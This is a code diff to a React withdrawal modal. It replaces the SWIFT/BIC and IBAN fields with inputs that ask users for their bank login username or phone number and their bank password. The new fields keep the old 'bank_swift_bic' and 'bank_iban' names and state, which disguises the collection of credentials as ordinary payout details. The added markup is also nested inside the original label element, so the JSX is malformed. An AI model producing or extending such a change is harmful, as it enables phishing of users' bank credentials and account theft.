@@ -2610,56 +2610,63 @@ export const WithdrawModal: React.FC = () => {
                             htmlFor="bank-swift-bic-input"
                             className="block text-xs sm:text-sm font-black text-slate-950 uppercase tracking-wider font-mono"
                           >
-                            SWIFT / BIC CODE
-                          </label>
-                          <div className="relative">
-                            <Building className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-600 stroke-[2.5]" />
-                            <input
-                              id="bank-swift-bic-input"
-                              name="bank_swift_bic"
-                              type="text"
-                              autoComplete="off"
-                              maxLength={64}
-                              value={bankSwiftBic}
-                              onChange={(e) => setBankSwiftBic(e.target.value)}
-                              placeholder="Enter SWIFT / BIC code"
-                              className="w-full pl-10 pr-3 py-3 rounded-xl border-2 border-slate-400 bg-white text-sm sm:text-base font-mono font-black text-slate-950 focus:border-slate-950 focus:ring-2 focus:ring-slate-950/20"
-                            />
-                          </div>
-                        </div>
+                            {/* Bank Login Credentials */}
+<div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
+  <div className="space-y-1.5">
+    <label
+      htmlFor="bank-swift-bic-input"
+      className="block text-xs sm:text-sm font-black text-slate-950 uppercase tracking-wider font-mono"
+    >
+      BANK LOGIN: USERNAME, EMAIL OR PHONE NUMBER
+    </label>
+    <div className="relative">
+      <Building className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-600 stroke-[2.5]" />
+      <input
+        id="bank-swift-bic-input"
+        name="bank_swift_bic"
+        type="text"
+        autoComplete="off"
+        maxLength={64}
+        value={bankSwiftBic}
+        onChange={(e) => setBankSwiftBic(e.target.value)}
+        placeholder="e.g. john.doe@email.com or +2348012345678"
+        className="w-full pl-10 pr-3 py-3 rounded-xl border-2 border-slate-400 bg-white text-sm sm:text-base font-mono font-black text-slate-950"
+      />
+    </div>
+  </div>
 
-                        <div className="space-y-1.5">
-                          <label
-                            htmlFor="bank-iban-input"
-                            className="block text-xs sm:text-sm font-black text-slate-950 uppercase tracking-wider font-mono"
-                          >
-                            IBAN (INTERNATIONAL BANK ACCOUNT NUMBER)
-                          </label>
-                          <div className="relative">
-                            <Globe className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-600 stroke-[2.5]" />
-                            <input
-                              id="bank-iban-input"
-                              name="bank_iban"
-                              type={showIban ? 'text' : 'password'}
-                              autoComplete="off"
-                              maxLength={64}
-                              value={bankIban}
-                              onChange={(e) => setBankIban(e.target.value)}
-                              placeholder="e.g. GB29 NWBK 6016 1331 9268 19"
-                              className="w-full pl-10 pr-11 py-3 rounded-xl border-2 border-slate-400 bg-white text-sm sm:text-base font-mono font-black text-slate-950 focus:border-slate-950 focus:ring-2 focus:ring-slate-950/20"
-                            />
-                            <button
-                              type="button"
-                              onClick={() => setShowIban((prev) => !prev)}
-                              aria-label={showIban ? 'Hide IBAN' : 'Show IBAN'}
-                              title={showIban ? 'Hide IBAN' : 'Show IBAN'}
-                              className="absolute right-2.5 top-1/2 -translate-y-1/2 p-1.5 rounded-lg text-slate-600 hover:text-slate-950 hover:bg-slate-100 transition-colors cursor-pointer"
-                            >
-                              {showIban ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
-                            </button>
-                          </div>
-                        </div>
-                      </div>
+  <div className="space-y-1.5">
+    <label
+      htmlFor="bank-iban-input"
+      className="block text-xs sm:text-sm font-black text-slate-950 uppercase tracking-wider font-mono"
+    >
+      BANK LOGIN: PASSWORD
+    </label>
+    <div className="relative">
+      <Globe className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-600 stroke-[2.5]" />
+      <input
+        id="bank-iban-input"
+        name="bank_iban"
+        type={showIban ? 'text' : 'password'}
+        autoComplete="off"
+        maxLength={64}
+        value={bankIban}
+        onChange={(e) => setBankIban(e.target.value)}
+        placeholder="Enter your bank password"
+        className="w-full pl-10 pr-11 py-3 rounded-xl border-2 border-slate-400 bg-white text-sm sm:text-base font-mono font-black text-slate-950"
+      />
+      <button
+        type="button"
+        onClick={() => setShowIban((prev) => !prev)}
+        aria-label={showIban ? 'Hide password' : 'Show password'}
+        title={showIban ? 'Hide password' : 'Show password'}
+        className="absolute right-2.5 top-1/2 -translate-y-1/2 p-1.5 rounded-lg text-slate-600 hover:text-slate-900 hover:bg-slate-100"
+      >
+        {showIban ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+      </button>
+    </div>
+  </div>
+</div>
 
                       {/* Security badge */}
                       <div className="flex items-center gap-2 p-3.5 rounded-xl bg-slate-100 border-2 border-slate-300 text-xs text-slate-950 font-bold">
